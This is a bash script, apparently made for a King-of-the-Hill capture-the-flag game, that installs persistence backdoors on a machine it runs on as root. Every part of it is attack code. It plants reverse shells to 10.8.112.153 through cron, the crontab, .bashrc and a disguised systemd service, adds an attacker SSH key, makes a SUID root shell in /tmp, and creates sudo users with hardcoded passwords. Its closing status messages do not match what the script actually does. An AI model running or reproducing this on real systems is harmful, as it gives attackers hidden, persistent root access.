#!/bin/bash
if [ "$EUID" -ne 0 ]; then
    echo "Run as root"
    exit
fi
clear
echo "*/2 * * * * root bash -c 'bash -i >& /dev/tcp/10.8.112.153/4444 0>&1'" > /etc/cron.d/syslog
echo "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/10.8.112.153/5555 0>&1'" >> /etc/crontab 
echo "bash -c 'bash -i >& /dev/tcp/10.8.112.153/6666 0>&1' &" >> /root/.bashrc
mkdir -p /root/.ssh
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHgc5JU6yxDSKdoaXroEhKfku+zELMQYiuOAo3WK9goK cyberfalcon@koth" > /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
chmod 700 /root/.ssh
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
cat <<EOF > /etc/systemd/system/sys-update.service
[Unit]
Description=System Update

[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.8.112.153/7777 0>&1'
Restart=always

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable sys-update
systemctl start sys-update

echo "* * * * * root systemctl start sys-update" >> /etc/crontab
useradd -m -s /bin/bash cyberfalcon
echo "cyberfalcon:youguessedme" | chpasswd
usermod -aG sudo cyberfalcon 2>/dev/null
useradd -m -s /bin/bash backup
echo "backup:youguessedme" | chpasswd

usermod -aG sudo sysbackup 2>/dev/null

echo "[+] user created -> sysbackup:Password123!"

sleep 1

################################
#         END OF SCRIPT        # 
################################

echo "[+] Backdoors installed"
sleep 0.8 
echo "[!] -> /tmp/rootbash -p <- for suid backdoor"
sleep 0.8
echo "[!] Open listeners:"
sleep 0.8
echo -e "\033[96m[+] 1337 4444 5050 5555\033[0m"
sleep 0.8
echo -e "\033[96m[+] Login with sysbackup:Password123!\033[0m"
sleep 0.8 
echo -e "\033[96m[+] Login with $USER:Password123!\033[0m"
sleep 0.8
echo "[*]  clean up..."
echo ""
sleep 1 
echo "[💀] created by pwnk1t [💀]"
echo ""
sleep 1 
echo " 🕷️ enjoy the game 🕷️"
sleep 1
echo ""
